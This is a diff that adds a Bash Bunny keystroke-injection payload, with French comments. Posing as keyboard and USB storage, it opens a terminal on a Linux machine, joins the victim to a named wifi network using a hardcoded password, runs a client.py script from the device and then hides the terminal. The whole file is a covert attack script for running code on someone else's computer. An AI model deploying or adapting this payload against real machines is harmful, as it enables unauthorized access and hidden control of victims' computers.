@@ -1,0 +1,35 @@
+# Will emulate keyboard and USB Storage
+
+LED SETUP
+ATTACKMODE STORAGE HID
+
+GET SWITCH_POSITION
+LED ATTACK
+
+Q DELAY 1000
+
+Q CTRL-ALT t
+Q DELAY 1000
+
+# on recupere le path de la bashbunny
+Q STRING str=$(lsblk | grep /*/BashBunny)
+Q ENTER
+Q DELAY 1000
+Q STRING strs=${str#*disk }
+Q ENTER
+Q DELAY 1000
+
+# connection a la wifi
+Q STRING nmcli dev wifi connect Hugo password 21062018
+Q ENTER
+
+# on attend 10s pour etre sur que la connection wifi se fasse
+Q DELAY 10000
+
+# on lance client.py
+Q STRING python3 $strs/payloads/switch2/client.py
+Q ENTER
+Q DELAY 1000
+
+# on cache le terminal
+Q CTRL z
